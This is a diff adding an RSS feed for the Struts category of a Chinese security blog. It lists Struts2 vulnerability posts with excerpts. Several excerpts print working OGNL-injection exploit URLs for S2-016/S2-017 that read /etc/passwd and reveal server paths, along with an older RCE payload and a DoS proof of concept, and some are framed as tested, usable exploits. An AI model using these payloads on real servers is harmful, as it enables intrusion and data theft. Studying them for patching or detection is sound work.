@@ -1,0 +1,165 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Struts on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+    <link>https://lcx.cc/categories/struts/</link>
+    <description>Recent content in Struts on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
+    <lastBuildDate>Mon, 10 Aug 2015 15:19:07 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/struts/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Struts2命令执行POC增强版</title>
+      <link>https://lcx.cc/post/4559/</link>
+      <pubDate>Mon, 10 Aug 2015 15:19:07 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4559/</guid>
+      <description>Struts2命令执行POC增强版 Wulala (^..^ ^..^ ^↓^ ^..^ ^..^) | 2015-08-04 13:06 Struts2命令执行的漏洞大家比我都了解, 网上公开的也有很多利用的POC. 带回显命</description>
+    </item>
+    
+    <item>
+      <title>Struts2 Tomcat 赋值造成的DoS及远程代码执行利用！</title>
+      <link>https://lcx.cc/post/4270/</link>
+      <pubDate>Sat, 05 Apr 2014 10:03:08 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4270/</guid>
+      <description>Struts2 Tomcat class.classLoader.resources.dirContext.docBase 赋值造成的DoS及远程代码执行利用! 0x00 背景 最近大家都在玩Struts2的class.classLoader.官方在S-20的两漏洞,一</description>
+    </item>
+    
+    <item>
+      <title>Struts2解析某些value值的include标签,webServer StackOverflow</title>
+      <link>https://lcx.cc/post/3917/</link>
+      <pubDate>Tue, 01 Oct 2013 09:17:20 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3917/</guid>
+      <description>比如: &amp;lt;s:include value=&#34;&#34; /&amp;gt; &amp;lt;s:include value=&#34;.&#34; /&amp;gt; &amp;lt;s:include value=&#34;/&#34; /&amp;gt; &amp;lt;s:include value=&#34;?&#34; /&amp;gt; poc.jsp: &amp;lt;%@ page language=&#34;java&#34; contentType=&#34;text/html; charset=utf-8&#34; pageEncoding=&#34;utf-8&#34;%&amp;gt; &amp;lt;%@ taglib prefix=&#34;s&#34; uri=&#34;/struts-tags&#34;%&amp;gt; &amp;lt;!DOCTYPE html PUBLIC &#34;-//W3C//DTD HTML 4.01 Transitional//EN&#34; &#34;http://www.w3.org/TR/html4/loose.dtd&#34;&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34;&amp;gt; &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;s:include value=&#34;&#34; /&amp;gt;PoC &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 访问poc.jsp后发现,webServer</description>
+    </item>
+    
+    <item>
+      <title>Struts2再爆远程代码执行漏洞（S2-016）</title>
+      <link>https://lcx.cc/post/3746/</link>
+      <pubDate>Sat, 20 Jul 2013 10:32:10 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3746/</guid>
+      <description>Struts又爆远程代码执行漏洞了！在这次的漏洞中，攻击者可以通过操纵参数远程执行恶意代码。Struts&amp;nbsp;2.3.15.1之前的版</description>
+    </item>
+    
+    <item>
+      <title>Struts2 S2-016/S2-017 命令执行带回显、看web路径、getshell exp整理</title>
+      <link>https://lcx.cc/post/3733/</link>
+      <pubDate>Thu, 18 Jul 2013 10:01:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3733/</guid>
+      <description>大家都发了，，我就整理了一下。友情提示，自己小命比shell重要哦。。 喜欢就点一下感谢吧^_^ 带回显命令执行： http://www.example.com/struts2-blank/example/X.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} 爆路径： http://www.example.com/struts2-blank/example/X.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D 写文件：</description>
+    </item>
+    
+    <item>
+      <title>Struts2 S2-016/S2-017 查看物理路径 EXP</title>
+      <link>https://lcx.cc/post/3732/</link>
+      <pubDate>Thu, 18 Jul 2013 09:57:08 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3732/</guid>
+      <description>http://www.xxx.com/xxxx.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D 已测试一个win站一个linux站均成功 修改自椰树安全网那个EXP。 [原帖地址]</description>
+    </item>
+    
+    <item>
+      <title>struts2 最新S2-016-S2-017漏洞通杀struts2所有版本</title>
+      <link>https://lcx.cc/post/3731/</link>
+      <pubDate>Thu, 18 Jul 2013 09:28:44 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3731/</guid>
+      <description>struts2 最新S2-016-S2-017漏洞通杀struts2所有版本 园长 (你在身边就是缘，缘分写在数据库里面。) | 2013-07-17 12:29 Struts2这个不争气的家</description>
+    </item>
+    
+    <item>
+      <title>Struts2 s-017 Working EXP</title>
+      <link>https://lcx.cc/post/3729/</link>
+      <pubDate>Thu, 18 Jul 2013 09:07:31 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3729/</guid>
+      <description>http://www.example.com/struts2-showcase/employee/save.action?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{&#39;cat&#39;,&#39;/etc/passwd&#39;})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()} 1# 基佬 (彩色避孕套，耐磨又耐操，用完还可以吹泡泡~) | 2013-07-17 16:11 前排留名 2# 陌路 | 2013-07-17 16:12 好像已经有人发过了 3# DragonEgg | 2013-07-17 16:13 @陌路 那个版块木有</description>
+    </item>
+    
+    <item>
+      <title>Struts2再爆远程代码执行漏洞</title>
+      <link>https://lcx.cc/post/3522/</link>
+      <pubDate>Thu, 23 May 2013 11:19:25 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3522/</guid>
+      <description>摘要 Apache官方的struts2产品，最近出了一个远程代码执行漏洞，编号“S2-013”，目前是0DAY，官方没有修补方案出现。 http://struts.apache.org/development/2.x/docs/security-bulletins.html — （公</description>
+    </item>
+    
+    <item>
+      <title>Struts2 5个远程代码执行漏洞利用POC &#43; 批量 &#43; DEMO</title>
+      <link>https://lcx.cc/post/3521/</link>
+      <pubDate>Thu, 23 May 2013 11:11:48 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3521/</guid>
+      <description>注：利用工具可以用任意语言编写其实就是发送漏洞代码就行了。一个request一个response，我尝试用过纯JS PHP JSP JavaSwing JavaFX 现在android</description>
+    </item>
+    
+    <item>
+      <title>Struts2文件下载功能不安全实现可能造成的文件读取问题！</title>
+      <link>https://lcx.cc/post/3501/</link>
+      <pubDate>Wed, 15 May 2013 11:03:32 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3501/</guid>
+      <description>文件下载功能不安全实现造成的文件读取问题也没什么大说特说的（其他语言也雷同），通常情况是，外部参数不安全引用到功能内部实现的路径中（简单点讲</description>
+    </item>
+    
+    <item>
+      <title>Struts框架开发安全特性</title>
+      <link>https://lcx.cc/post/3291/</link>
+      <pubDate>Sun, 20 Jan 2013 15:14:25 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3291/</guid>
+      <description>此文是我前年研究struts框架相关安全特性做的总结，这里发上来，各位安全工作人员在查找Struts相关应用的漏洞有一定用处，但因为是去年的</description>
+    </item>
+    
+    <item>
+      <title>Struts2漏洞浅析之Ongl代码执行分析</title>
+      <link>https://lcx.cc/post/3173/</link>
+      <pubDate>Mon, 17 Dec 2012 23:01:02 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3173/</guid>
+      <description>唐门三少 发表于 2012-12-9 13:38 0x01 简述 2010年7月exploitdb爆出的《Struts2/XWork &amp;lt; 2.2.0 Remote Command Execution Vulnerability》，可以称之为</description>
+    </item>
+    
+    <item>
+      <title>Struts2漏洞分析之Ognl表达式特性引发的新思路</title>
+      <link>https://lcx.cc/post/3171/</link>
+      <pubDate>Mon, 17 Dec 2012 21:58:47 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3171/</guid>
+      <description>唐门三少 发表于 2012-12-14 14:23 0x01 摘要 在Ognl表达式中，会将被括号“()”包含的变量内容当做Ognl表达式执行。Ognl表达式的这一特性，引发出一种新的</description>
+    </item>
+    
+    <item>
+      <title>apache struts2 remote code execute</title>
+      <link>https://lcx.cc/post/2813/</link>
+      <pubDate>Fri, 24 Aug 2012 08:55:06 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2813/</guid>
+      <description>apache struts2 remote code execute, Aug 21 2012 01:54 PM. this method was published at xcon2012 xcon.xfocus.net. kxlzx http://www.inbreak.net flow this and step by step: 1, down load struts2-showcase from struts.apache.org 2, run struts2-showcase. 3, open url: http://localhost:8080/struts2-showcase/skill/edit.action?skillName=SPRIN G-DEV 4, write skill name to %{expr} for example: %{(#_memberAccess[&#39;allowStaticMethodAccess&#39;]=true)(#context[&#39;xwork.Metho dAccessor.denyMethodExecution&#39;]=false)(#hackedbykxlzx=@org.apache.struts 2.ServletActionContext@getResponse().getWriter(),#hackedbykxlzx.println( &#39;hacked by kxlzx&#39;),#hackedbykxlzx.close())} 5, submit and all will done. this method: public static String translateVariables(String expression, ValueStack stack) { return</description>
+    </item>
+    
+    <item>
+      <title>关于 struts2 的一点分析</title>
+      <link>https://lcx.cc/post/2647/</link>
+      <pubDate>Thu, 05 Jul 2012 09:10:33 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/2647/</guid>
+      <description>关于struts2的漏洞原理，空虚浪子心分析的已经非常详尽了。 我这里只是对于构造exp的补充。 现在流传的exp 大致写法和我之前在http:/</description>
+    </item>
+    
+    <item>
+      <title>【转载】Struts2/XWork &lt; 2.2.0 远程执行漏洞</title>
+      <link>https://lcx.cc/post/321/</link>
+      <pubDate>Sat, 17 Jul 2010 17:30:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/321/</guid>
+      <description>来自 http://neeao.com/archives/59/ 1.exploit-db网站在7月14日爆出了一个Struts2的远程执行任意代码的漏洞，此漏洞危害之大，可谓百发百中，直接root，</description>
+    </item>
+    
+  </channel>
+</rss>
